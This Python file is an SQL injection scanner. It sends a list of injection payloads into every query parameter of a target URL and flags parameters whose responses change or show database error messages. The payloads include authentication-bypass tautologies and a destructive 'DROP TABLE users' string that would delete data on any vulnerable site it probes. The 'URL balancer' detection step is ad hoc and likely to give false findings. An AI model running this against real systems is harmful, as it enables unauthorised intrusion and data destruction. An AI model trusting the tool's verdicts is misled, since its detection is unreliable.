import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote_plus

# Common SQL injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "\" OR \"1\"=\"1",
]

# Generic SQL error signatures (any error)
SQL_ERROR_INDICATORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax error",
    "mysql_fetch_array()",
    "syntax error",
    "mysql_num_rows()",
    "ORA-01756",
    "SQLite3::",
    "psql: error",
    "pg_query():",
    "mysql_numrows()",
]

def scan(url, timeout=10):
    """
    Scan URL for SQL Injection by injecting payloads into query parameters,
    checking content disappearance and restoration after 'url balancer',
    and detecting any SQL errors.
    """

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        return "[!] No query parameters found to test SQL Injection."

    try:
        # Get baseline normal page content
        normal_response = requests.get(url, timeout=timeout)
        normal_text = normal_response.text
    except requests.RequestException as e:
        return f"[!] Failed to fetch normal URL content: {e}"

    vulnerable = False
    findings = []

    for param in query_params:
        original_values = query_params[param]

        for payload in SQL_PAYLOADS:
            # Inject raw payload
            injected_values = original_values.copy()
            injected_values[0] = payload
            injected_query = urlencode({**query_params, param: injected_values}, doseq=True)
            injected_url = urlunparse(parsed_url._replace(query=injected_query))

            try:
                injected_response = requests.get(injected_url, timeout=timeout)
                injected_text = injected_response.text
            except requests.RequestException as e:
                findings.append(f"[!] Request error testing param '{param}' with payload '{payload}': {e}")
                continue

            # Check if content disappeared/changed
            content_changed = normal_text != injected_text

            # Check SQL errors present in injected response
            errors_found = [err for err in SQL_ERROR_INDICATORS if err.lower() in injected_text.lower()]

            # Apply "URL balancer" - encode payload and re-request
            encoded_payload = quote_plus(payload)
            encoded_values = original_values.copy()
            encoded_values[0] = encoded_payload
            encoded_query_encoded = urlencode({**query_params, param: encoded_values}, doseq=True)
            encoded_url = urlunparse(parsed_url._replace(query=encoded_query_encoded))

            try:
                encoded_response = requests.get(encoded_url, timeout=timeout)
                encoded_text = encoded_response.text
            except requests.RequestException as e:
                findings.append(f"[!] Request error during URL balancer for param '{param}': {e}")
                continue

            # Check if page restored back to normal after balancer step
            restored_after_balancer = (encoded_text == normal_text)

            # Vulnerability logic:
            # If content changed after raw injection but restored after balancer,
            # regardless of errors found, mark vulnerable
            if content_changed and restored_after_balancer:
                vulnerable = True
                findings.append(
                    f"[+] Potential SQL Injection vulnerability on parameter '{param}' with payload '{payload}':\n"
                    f"    - Content changed/disappeared on raw injection but restored after URL balancer.\n"
                    f"    - URL tested: {injected_url}"
                )
            # Also report if SQL errors found with payload (even if no content change)
            elif errors_found:
                vulnerable = True
                findings.append(
                    f"[+] SQL error messages detected on parameter '{param}' with payload '{payload}':\n"
                    f"    - Errors: {', '.join(errors_found)}\n"
                    f"    - URL tested: {injected_url}"
                )

    if not vulnerable:
        return "[*] No SQL Injection vulnerabilities detected."

    return "\n\n".join(findings)
